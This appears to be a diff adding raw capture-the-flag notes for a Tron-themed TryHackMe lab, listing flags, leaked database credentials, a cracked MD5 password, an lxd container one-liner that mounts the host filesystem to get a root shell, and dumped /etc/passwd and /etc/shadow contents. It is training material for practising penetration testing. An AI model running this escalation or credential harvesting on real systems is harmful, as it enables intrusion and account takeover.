@@ -1,0 +1,171 @@
+
+forward,drop,forward
+
+
+GET /assets/js/upload.js HTTP/1.1
+Host: 10.10.139.108:65000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Referer: http://10.10.139.108:65000/uploads.php
+Cookie: PHPSESSID=89vp06dpog3r5qtdgi6lqtce1m
+If-Modified-Since: Sun, 20 Dec 2020 02:34:41 GMT
+If-None-Match: "142-5b6dc2efdd240-gzip"
+Cache-Control: max-age=0
+
+
+upload shell, execute in /grid/
+
+
+
+
+
+/var/www/web.txt
+THM{ENTER_THE_GRID}
+
+
+
+
+$dbaddr = "localhost";
+$dbuser = "tron";
+$dbpass = "IFightForTheUsers";
+$database = "tron";
+
+
+
+
+mysql -u tron -p 
+
+use tron;
+
+show tables;
+
++----------------+
+| Tables_in_tron |
++----------------+
+| users          |
++----------------+
+
+
+mysql> select * FROM users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
++----+----------+----------------------------------+
+1 row in set (0.01 sec)
+
+
+
+
+Found
+
+MD5 edc621628f6d19a13a00fd683f5e3ff7:$HEX[40636f6d707574657240]
+
+@computer@
+
+
+
+user.txt
+THM{IDENTITY_DISC_RECOGNISED}
+
+
+
+
+uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+
+
+
+
+
+lxc init Alpine strongbad -c security.privileged=true && lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true && lxc start strongbad && lxc exec strongbad /bin/sh
+
+
+
+root.txt
+THM{FLYNN_LIVES}
+
+
+
+"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
+
+
+
+
+
+/etc/passwd
+
+/mnt/root/root # cat /mnt/root/etc/passwd
+cat /mnt/root/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+flynn:x:1000:1000:flynn,,,:/home/flynn:/bin/bash
+
+
+
+
+/etc/shadow
+
+
+root:$6$9RdusMNG$o8jT9NA95vdChZkC6jCvz2jiqWnKVziTGC2Nagm5rVL5.ZthTrE/Qwx5F/uCfFip2m6g57aAKS63ydbcIEP0a0:18614:0:99999:7:::
+daemon:*:17647:0:99999:7:::
+bin:*:17647:0:99999:7:::
+sys:*:17647:0:99999:7:::
+sync:*:17647:0:99999:7:::
+games:*:17647:0:99999:7:::
+man:*:17647:0:99999:7:::
+lp:*:17647:0:99999:7:::
+mail:*:17647:0:99999:7:::
+news:*:17647:0:99999:7:::
+uucp:*:17647:0:99999:7:::
+proxy:*:17647:0:99999:7:::
+www-data:*:17647:0:99999:7:::
+backup:*:17647:0:99999:7:::
+list:*:17647:0:99999:7:::
+irc:*:17647:0:99999:7:::
+gnats:*:17647:0:99999:7:::
+nobody:*:17647:0:99999:7:::
+systemd-network:*:17647:0:99999:7:::
+systemd-resolve:*:17647:0:99999:7:::
+syslog:*:17647:0:99999:7:::
+messagebus:*:17647:0:99999:7:::
+_apt:*:17647:0:99999:7:::
+mysql:!:18614:0:99999:7:::
+lxd:*:18614:0:99999:7:::
+uuidd:*:18614:0:99999:7:::
+dnsmasq:*:18614:0:99999:7:::
+landscape:*:18614:0:99999:7:::
+sshd:*:18614:0:99999:7:::
+pollinate:*:18614:0:99999:7:::
+flynn:$6$ZtFzHpgW$o1mcNk4TTH4hr.dZKi0I1gtr9xJI0sBDTqsZM.1sgiPtNFC5jzMqUl8b3hcxkFZhDV5cDxLUeY1WTfrJG1aXM0:18614:0:99999:7:::
